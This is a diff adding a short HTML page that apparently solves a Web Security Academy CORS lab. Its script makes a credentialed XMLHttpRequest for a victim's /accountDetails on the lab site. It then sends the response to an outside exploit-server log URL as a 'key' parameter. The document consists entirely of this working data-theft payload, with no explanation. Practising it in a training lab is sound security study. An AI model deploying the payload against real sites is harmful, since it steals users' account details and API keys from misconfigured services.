@@ -1,0 +1,15 @@
+<html>
+	<body>
+		<script>
+			var req = new XMLHttpRequest(); 
+			req.onload = reqListener; 
+			req.open('get','https://0a8800e1044abcea81dd3f73002700f1.web-security-academy.net/accountDetails',true); 
+			req.withCredentials = true; 
+			req.send();  
+
+			function reqListener() 
+			{    
+				location='//exploit-0ae7001c0479bcf5814f3e7d01d30067.exploit-server.net/log?key='+this.responseText; 
+			};
+
+</script>
